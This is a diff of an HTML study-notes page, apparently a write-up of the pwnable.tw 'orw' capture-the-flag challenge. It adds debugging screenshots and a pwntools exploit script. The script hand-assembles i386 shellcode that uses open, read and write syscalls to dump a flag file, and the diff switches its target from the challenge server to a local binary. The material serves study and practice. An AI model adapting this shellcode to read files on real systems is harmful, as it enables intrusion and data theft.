@@ -1384,6 +1384,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../Note/Interview/操作系统/" title="操作系统" class="md-nav__link">
+      操作系统
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../Note/Interview/数据结构的应用/" title="数据结构的应用" class="md-nav__link">
       数据结构的应用
     </a>
@@ -1524,8 +1536,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#0x02" title="0x02" class="md-nav__link">
-    0x02
+  <a href="#0x02-exp" title="0x02 EXP" class="md-nav__link">
+    0x02 EXP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" title="0x03 其他" class="md-nav__link">
+    0x03 其他
   </a>
   
 </li>
@@ -1603,8 +1622,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#0x02" title="0x02" class="md-nav__link">
-    0x02
+  <a href="#0x02-exp" title="0x02 EXP" class="md-nav__link">
+    0x02 EXP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" title="0x03 其他" class="md-nav__link">
+    0x03 其他
   </a>
   
 </li>
@@ -1673,7 +1699,7 @@ Only open read write syscall are allowed to use.
 <p>因此，本题的主要目的是构造shellcode</p>
 <p>以下是需要注意的点</p>
 <ul>
-<li><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html">系统调用号</a></li>
+<li><a href="http://syscalls.kernelgrok.com/">系统调用号</a></li>
 </ul>
 <!-- todo 调试说明？ -->
 
@@ -1687,13 +1713,19 @@ Only open read write syscall are allowed to use.
 <li>
 <p>linux的返回值一般在寄存器eax中</p>
 </li>
-<li>sys_open<ul>
-<li></li>
-</ul>
-</li>
+<li>sys_open</li>
+<li>sys_read</li>
+<li>sys_write</li>
 </ul>
 <h2 id="0x01">0x01 调试<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
-<h2 id="0x02">0x02<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<p>sys_open</p>
+<p><img alt="" src="../2019-08-04-21-34-05.png" /></p>
+<p>sys_read</p>
+<p><img alt="" src="../2019-08-04-21-35-59.png" /></p>
+<p>sys_write</p>
+<p>这里的&rdquo;this is a test flag&rdquo;是自己创建的，用于调试</p>
+<p><img alt="" src="../2019-08-04-21-36-21.png" /></p>
+<h2 id="0x02-exp">0x02 EXP<a class="headerlink" href="#0x02-exp" title="Permanent link">&para;</a></h2>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
  2
  3
@@ -1723,13 +1755,37 @@ Only open read write syscall are allowed to use.
 27
 28
 29
-30</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1"># coding:utf-8</span>
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1"># coding:utf-8</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">pwnlib</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="c1"># p = process(&#39;./orw&#39;)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./orw&#39;</span><span class="p">)</span>
+<span class="c1"># p = remote(&#39;chall.pwnable.tw&#39;, 10001)</span>
 
 
 <span class="k">def</span> <span class="nf">gdb_attach</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
@@ -1737,24 +1793,53 @@ Only open read write syscall are allowed to use.
     <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
 
 
-<span class="n">push_file_name</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;/home/orw/flag&quot;</span><span class="p">)</span>
-<span class="n">open_file</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s2">&quot;SYS_open&quot;</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">)</span>
-<span class="n">read_file_to_fd</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s2">&quot;SYS_read&quot;</span><span class="p">,</span> <span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
-<span class="n">write_from_fd_to_stdin</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s2">&quot;SYS_write&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="n">push_file_name</span><span class="o">+</span><span class="n">open_file</span> <span class="o">+</span> <span class="n">read_file_to_fd</span><span class="o">+</span><span class="n">write_from_fd_to_stdin</span>
+<span class="c1"># push_file_name = shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)</span>
+<span class="c1"># open_file = shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)</span>
+<span class="c1"># read_file_to_fd = shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)</span>
+<span class="c1"># write_from_fd_to_stdin = shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)</span>
+<span class="c1"># shellcode = push_file_name+open_file + read_file_to_fd+write_from_fd_to_stdin</span>
 
-<span class="c1"># shellcode = &#39;&#39;</span>
-<span class="c1"># shellcode += &quot;xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;&quot;</span>
-<span class="c1"># shellcode += &quot;xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&quot;</span>
-<span class="c1"># shellcode += &quot;mov eax,0x4; mov bl,0x1;int 0x80;&quot;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="c1"># # open(file,0,0)</span>
+<span class="n">shellcode</span> <span class="o">+=</span>    <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">                xor ecx,ecx;</span>
+<span class="s2">                mov eax,0x5;</span>
+<span class="s2">                push ecx;</span>
+<span class="s2">                push 0x67616c66;</span>
+<span class="s2">                push 0x2f77726f;</span>
+<span class="s2">                push 0x2f656d6f;</span>
+<span class="s2">                push 0x682f2f2f;</span>
+<span class="s2">                mov ebx,esp;</span>
+<span class="s2">                xor edx,edx;</span>
+<span class="s2">                int 0x80;</span>
+<span class="s2">                &quot;&quot;&quot;</span>
+<span class="c1"># read(3,file,0x30)</span>
+<span class="n">shellcode</span> <span class="o">+=</span>    <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">                mov eax,0x3;</span>
+<span class="s2">                mov ecx,ebx;</span>
+<span class="s2">                mov ebx,0x3;</span>
+<span class="s2">                mov dl,0x30;</span>
+<span class="s2">                int 0x80;</span>
+<span class="s2">                &quot;&quot;&quot;</span>
+<span class="c1"># write(1,file,0x30)</span>
+<span class="n">shellcode</span> <span class="o">+=</span>    <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">                mov eax,0x4;</span>
+<span class="s2">                mov bl,0x1;</span>
+<span class="s2">                int 0x80;</span>
+<span class="s2">                &quot;&quot;&quot;</span>
 
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
-<span class="c1"># gdb_attach(p)</span>
+<span class="n">gdb_attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 </td></tr></table>
+
+<h2 id="0x03">0x03 其他<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<p>看到<a href="https://blog.csdn.net/qq_29343201/article/details/78109066?locationNum=3&amp;fps=1">Anciety的博客</a>，打算试试dump
+（给学弟递茶）</p>
+<p>Todo 过段时间再弄</p>
                 
                   
                 
